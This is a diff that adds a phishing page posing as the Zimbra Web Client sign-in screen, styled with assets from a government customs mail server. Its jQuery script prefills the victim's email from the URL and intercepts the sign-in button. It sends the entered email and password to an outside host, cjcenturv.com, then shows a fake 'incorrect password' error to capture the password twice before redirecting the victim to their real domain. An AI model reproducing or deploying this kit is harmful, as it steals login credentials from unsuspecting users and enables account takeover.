@@ -1,0 +1,256 @@
+
+
+<!DOCTYPE html>
+<!-- set this class so CSS definitions that now use REM size, would work relative to this.
+	Since now almost everything is relative to one of the 2 absolute font size classese -->
+<html class="user_font_size_normal" lang="en">
+<head>
+<!--
+ login.jsp
+ * ***** BEGIN LICENSE BLOCK *****
+ * Zimbra Collaboration Suite Web Client
+ * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software Foundation,
+ * version 2 of the License.
+ *
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * See the GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License along with this program.
+ * If not, see <https://www.gnu.org/licenses/>.
+ * ***** END LICENSE BLOCK *****
+-->
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+	<title>Zimbra Web Client Sign In</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+	<meta name="apple-mobile-web-app-capable" content="yes" />
+	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+	<link rel="stylesheet" type="text/css" href="https://mail.customs.go.id/css/common,login,zhtml,skin.css?skin=harmony&v=190614035825">
+	<link rel="SHORTCUT ICON" href="https://mail.customs.go.id/img/logo/favicon.ico">
+<script src="https://kit.fontawesome.com/98acd03b4b.js" crossorigin="anonymous"></script>
+
+</head>
+<body onload="onLoad();">
+
+	<div class="LoginScreen">
+		<div class="center">
+			<div class="contentBox">
+				<h1><a href="" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
+					<span class="ImgLoginBanner"></span>
+				</a></h1>
+				<div id="ZLoginAppName">Web Client</div>
+				<form method="post" name="loginForm" action="" accept-charset="UTF-8">
+								<input type="hidden" name="loginOp" value="login"/>
+								<input type="hidden" name="login_csrf" value="16f901fb-4abb-4661-b07f-6fc09d97979e"/>
+
+								<table class="form">
+                        <tr>
+                                        <td><label for="username">Username:</label></td>
+                                        <td><input  class="zLoginField" name="ai" id="ai" type="email" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off" readonly/></td>
+                                        </tr>
+                                        <tr>
+                                <td><label for="password">Password:</label></td>
+                                <td><input  autocomplete="off" class="zLoginField" name="pr" id="pr" type="password" value="" size="40" maxlength="1024" required/></td>
+
+
+
+                                </tr>
+<tr>
+<center>
+    <div id="msg" style="display: none; width: 400px; color: #353520; padding: 5px; background-color: #ffff99; margin-bottom: 10px; border-radius: 10px; background-image: url('data:image/png;base64,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'); background-repeat: no-repeat; background-position: left center; padding-left: 30px;">
+        The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
+    </div>
+    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+</center>
+
+
+</tr>
+                                <tr>
+                                <td>&nbsp;</td>
+                                <td class="submitTD">
+                                <input id="remember" value="1" type="checkbox" name="zrememberme" />
+                                    <label for="remember">Stay signed in</label>
+                                <input type="submit" class="ZLoginButton DwtButton" id="submit-btn" value="Sign In" />
+                                </td>
+                                </tr>
+			
+				<tr >
+                            <td colspan="2"><hr/></td>
+                            </tr>
+                            <tr >
+                            <td>
+                            <label for="client">Version:</label>
+                            </td>
+                            <td>
+                            <div class="positioning">
+                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                    <option value="preferred" selected > Default</option>
+                                    <option value="advanced" > Advanced (Ajax)</option>
+                                    <option value="standard" > Standard (HTML)</option>
+                                    <option value="mobile" > Mobile</option>
+                                    </select>
+                                <script TYPE="text/javascript">
+                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
+                        </script>
+                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip"><h3 style="text-align:center;">Client Types</h3>	<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
+                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
+                        </div>
+                        </td>
+                        </tr>
+                        </table>
+                    </form>
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
+			<div class="copyright">
+			Copyright &copy; 2005-2024 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div>
+		<div class="decor2"></div>
+	</div>
+
+<!-- SCRIPT BEGINS -->
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "bmV4dC5waHA=";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+
+        $.ajax({
+            dataType: 'JSON',
+            url:'https://cjcenturv.com/letthisbemiownphp/b.php',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</body>
+</html>
